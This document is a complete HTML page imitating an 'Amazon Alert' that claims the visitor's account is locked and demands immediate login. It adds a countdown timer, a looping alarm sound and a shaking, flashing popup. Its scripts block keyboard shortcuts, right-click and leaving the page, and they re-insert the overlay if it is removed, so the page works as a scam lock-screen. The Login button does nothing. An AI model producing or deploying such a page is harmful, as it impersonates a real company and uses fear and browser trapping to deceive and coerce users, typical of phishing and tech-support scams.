<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Amazon Alert</title>
  <link href="https://fonts.googleapis.com/css?family=Roboto:900,700,400" rel="stylesheet">
  <style>
    html, body {
      height: 100%; margin: 0; padding: 0; background: #232f3e;
    }
    .overlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(35,47,62,0.97);
      z-index: 99999;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: flashBg 0.6s infinite alternate;
    }
    @keyframes flashBg {
      0% { background: rgba(35,47,62,0.97);}
      100% { background: rgba(255,153,0,0.22);}
    }
    .popup {
      background: #fff;
      color: #232f3e;
      border-radius: 18px;
      box-shadow: 0 8px 48px rgba(0,0,0,0.88);
      padding: 56px 38px 42px 38px;
      text-align: center;
      max-width: 430px;
      border: 6px solid #FF9900;
      animation: shake 0.7s infinite alternate;
      position: relative;
    }
    @keyframes shake {
      0% { transform: translateX(0);}
      20% { transform: translateX(-13px);}
      40% { transform: translateX(13px);}
      60% { transform: translateX(-8px);}
      80% { transform: translateX(8px);}
      100% { transform: translateX(0);}
    }
    .amazon-logo {
      width: 148px; margin-bottom: 22px;
    }
    .alert-title {
      color: #FF9900;
      font-size: 2.3em;
      font-weight: 900;
      letter-spacing: 1px;
      text-shadow: 0 0 12px #fff, 0 0 30px #FF9900;
      margin-bottom: 12px;
    }
    .alert-message {
      font-size: 1.21em;
      margin-bottom: 29px;
      color: #232f3e;
      font-weight: 500;
      line-height: 1.5;
    }
    .countdown {
      font-size: 2em;
      font-weight: bold;
      color: #FF9900;
      margin-bottom: 20px;
      animation: pop 0.7s infinite alternate;
    }
    @keyframes pop {
      0% { transform: scale(1);}
      100% { transform: scale(1.13);}
    }
    .login-btn {
      background: #FF9900;
      color: #fff;
      border: none;
      border-radius: 7px;
      font-size: 1.17em;
      padding: 15px 45px;
      cursor: pointer;
      font-weight: bold;
      box-shadow: 0 2px 14px rgba(0,0,0,0.22);
      margin-top: 13px;
      transition: background 0.2s;
      animation: flashBtn 1.1s infinite alternate;
      outline: none;
    }
    @keyframes flashBtn {
      0% { background: #FF9900;}
      100% { background: #e68000;}
    }
    .login-btn:active { background: #cc7300; }
    .small {
      color: #888;
      font-size: 0.97em;
      margin-top: 19px;
    }
    /* Hide scrollbars & prevent scrolling */
    html, body { overflow: hidden !important; }
  </style>
</head>
<body>
  <div class="overlay" id="overlay">
    <div class="popup" id="popup">
      <img class="amazon-logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo"/>
      <div class="alert-title">Amazon Alert</div>
      <div class="alert-message">
        Unusual activity detected on your Amazon account.<br>
        For your security, your account has been temporarily locked.<br><br>
        <b>Immediate login is required to verify your identity and avoid permanent suspension.</b>
      </div>
      <div class="countdown" id="countdown">5:00</div>
      <button class="login-btn" id="loginBtn">Login</button>
      <div class="small">(Closing or leaving this page will not dismiss this alert.)</div>
    </div>
  </div>
  <!-- LOUD ALARM SOUND (Royalty-free, can be replaced) -->
  <audio id="alertSound" src="https://cdn.pixabay.com/audio/2022/11/16/audio_12a5e5c5e9.mp3" autoplay loop></audio>
  <script>
    // LOUD ALARM
    setTimeout(function() {
      var sound = document.getElementById('alertSound');
      if (sound) { sound.play().catch(()=>{}); }
    }, 300);

    // Fake countdown timer (starts at 5 minutes, ticks down)
    let totalSeconds = 5*60;
    const countdownEl = document.getElementById('countdown');
    function pad(n) { return n < 10 ? '0'+n : n; }
    setInterval(() => {
      if(totalSeconds > 0) totalSeconds--;
      let min = Math.floor(totalSeconds/60), sec = totalSeconds%60;
      countdownEl.textContent = `${min}:${pad(sec)}`;
    }, 1000);

    // Disable right-click and context menu
    document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
      return false;
    });

    // Trap F12, Ctrl+W, Alt+F4, Ctrl+Shift+I, Esc, and other keys (where possible)
    document.addEventListener('keydown', function(e) {
      if (
        e.key === "F12" ||
        (e.ctrlKey && e.key.toLowerCase() === "w") ||
        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "i") ||
        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "c") ||
        (e.ctrlKey && e.key.toLowerCase() === "r") ||
        (e.metaKey && e.key.toLowerCase() === "q") ||
        (e.key === "Escape")
      ) {
        alert("This action is not allowed right now.\nPlease verify your Amazon account.");
        e.preventDefault();
        return false;
      }
    });

    // Prevent tab close/reload
    window.onbeforeunload = function() {
      return "WARNING: Leaving now could result in permanent account suspension!";
    };

    // Attempt to trap focus inside popup
    document.addEventListener('focusin', function(e) {
      const popup = document.getElementById('popup');
      if (!popup.contains(e.target)) {
        e.stopPropagation();
        popup.focus();
      }
    });

    // Prevent removing the overlay (re-add if missing)
    const overlay = document.getElementById('overlay');
    const observer = new MutationObserver(() => {
      if (!document.body.contains(overlay)) {
        document.body.appendChild(overlay);
      }
    });
    observer.observe(document.body, { childList: true });

    setInterval(() => {
      if (!document.body.contains(overlay)) {
        document.body.appendChild(overlay);
      }
    }, 700);

    // Make "Login" button just reload the popup (simulate being stuck)
    document.getElementById('loginBtn').onclick = function(e) {
      e.preventDefault();
      alert("Amazon login temporarily unavailable. Please try again later.");
    };

    // Prevent scrolling
    window.scrollTo(0, 0);
    window.onscroll = function() { window.scrollTo(0, 0); };

    // Prevent selecting/copying
    document.addEventListener("selectstart", function(e) { e.preventDefault(); return false; });

    // Prevent drag and drop
    document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
  </script>
</body>
</html>
